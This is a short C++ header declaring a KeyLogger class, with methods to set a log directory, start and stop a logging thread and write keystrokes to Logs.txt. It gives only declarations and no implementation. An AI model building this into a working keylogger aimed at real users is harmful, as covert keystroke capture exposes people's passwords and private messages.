#pragma once

#include <string>
#include <thread>

const std::string FILE_NAME = "\\Logs.txt";

/// <summary>
/// Key logger can create a log to the keyboard
/// </summary>
class KeyLogger
{
public:
	int SetDirectory(const char*);
	std::thread StartKeyLogger();
	void StopLogging();
	void SetDefaultDirectory();
	KeyLogger();
	KeyLogger(KeyLogger&);
	KeyLogger(const char*);
private:
	std::string directory;
	bool loggerState;
	void StartKeyLoggerThread();
	int CreateLogFile();
};
